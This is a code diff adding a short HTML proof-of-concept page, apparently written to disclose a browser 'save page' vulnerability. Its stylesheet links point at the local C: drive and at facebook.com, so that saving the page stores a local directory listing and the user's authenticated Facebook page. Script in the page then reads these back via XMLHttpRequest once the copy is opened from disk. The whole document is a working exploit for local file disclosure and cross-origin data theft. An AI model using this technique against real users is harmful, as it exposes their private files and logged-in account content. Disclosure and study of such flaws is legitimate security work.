@@ -1,0 +1,32 @@
+<html>
+<head>
+    <title>POC</title>
+    <link rel="stylesheet" href="file:///C://" />
+    <link rel="stylesheet" href="https://www.facebook.com/" />
+</head>
+<body>
+    <textarea style="width: 434px; height: 310px;" id="facebook"></textarea>
+    <textarea style="width: 434px; height: 310px;" id="files"></textarea>
+    <script type="application/javascript">
+        var doQ = (q) => { //Simple XMLHttpRequest
+            try {
+                var oReq = new XMLHttpRequest();
+                oReq.addEventListener("load", function(e) {
+                    console.dir(e)
+                });
+                oReq.open("GET", q, false);
+                oReq.send();
+            } catch (e) {
+                alert('File not found or restricted.')
+            };
+            return oReq.response;
+        };
+        if (location.protocol == 'file:') {
+            facebook.value = doQ('./POC_files/a.htm');
+            files.value = doQ('./POC_files/a');
+        } else {
+            alert('Please hit CTRL+S and save this page first then open it locally.');
+        }
+    </script>
+</body>
+</html>
